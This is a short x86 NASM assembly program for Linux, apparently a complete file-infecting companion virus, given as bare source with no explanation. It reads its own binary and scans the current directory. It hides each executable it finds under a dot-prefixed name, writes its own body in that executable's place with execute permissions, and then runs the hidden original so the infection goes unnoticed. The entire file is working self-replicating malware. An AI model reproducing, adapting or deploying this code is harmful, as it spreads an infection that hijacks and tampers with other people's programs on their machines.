section .data
	dir_name db '.',0
	dot_self db '.'
	self_name times(33) db 0
	dot_name db '.'
	file_name times(33) db 0
section .bss
	self_len resd 1
	st_buf resb 64
	self_buf resb 1024
	dir_buf resb 4096
section .text
	global _start
_start:
	;recordname
	pop ecx
	pop ebx
	push ebx
	push ecx
	add ebx,2
	mov edx,ebx
	mov eax,self_name
_copyname:
	cmp byte[edx],0
	je _openself
	mov cl,byte[edx]
	mov byte[eax],cl
	inc edx
	inc eax
	jmp _copyname
	
_openself:
	mov eax,5
	xor ecx,ecx
	int 80h
	
	;fstatself
	mov ebx,eax
	mov ecx,st_buf
	mov eax,108
	int 80h
	
	;readlen
	mov edx,dword[st_buf+20]
	mov dword[self_len],edx
	
	;readself
	mov eax,3
	mov ecx,self_buf
	int 80h
	
	;closeself
	mov eax,6
	int 80h
	
	;opendir
	mov eax,5
	mov ebx,dir_name
	xor ecx,ecx
	int 80h
	
	;readdir
	mov ebx,eax
	mov eax,141
	mov ecx,dir_buf
	mov edx,4096
	int 80h
	
	;closedir
	mov eax,6
	int 80h
	
	mov esi,dir_buf
_infect:
	movzx edi,word[esi+8]
	test edi,edi
	jz _exechost
	mov ebx,esi
	add ebx,10
	add esi,edi
	
	cmp byte[ebx],0x2e
	je _infect
	
	;stathost
	mov eax,106
	mov ecx,st_buf
	int 80h
	movzx edx,word[st_buf+8]
	and edx,49h
	test edx,edx
	jz _infect
	
	mov edx,ebx
	mov eax,file_name
_copyname2:
	cmp byte[edx],0
	je _renamehost
	mov cl,byte[edx]
	mov byte[eax],cl
	inc edx
	inc eax
	jmp _copyname2

_renamehost:
	mov byte[eax],0
	mov eax,5
	mov edx,ebx
	mov ebx,dot_name
	xor ecx,ecx
	int 80h
	cmp eax,0
	jle _gorename
	mov ebx,eax
	mov eax,6
	int 80h
	jmp _infect
_gorename:
	mov ebx,edx
	mov eax,38
	mov ecx,dot_name
	int 80h
	cmp eax,0
	jl _infect
	
	;copyself
	mov eax,8
	mov ecx,1
	int 80h
	mov ebx,eax
	mov eax,4
	mov ecx,self_buf
	mov edx,dword[self_len]
	int 80h
	mov eax,6
	int 80h
	mov eax,15
	mov ebx,file_name
	mov ecx,0x81ed
	int 80h

	jmp _infect
	
_exechost:
	mov eax,11
	mov ebx,dot_self
	pop ecx
	mov ecx,esp
	xor edx,edx
	int 80h
	
_exit:
	mov eax,1
	xor ebx,ebx
	int 80h
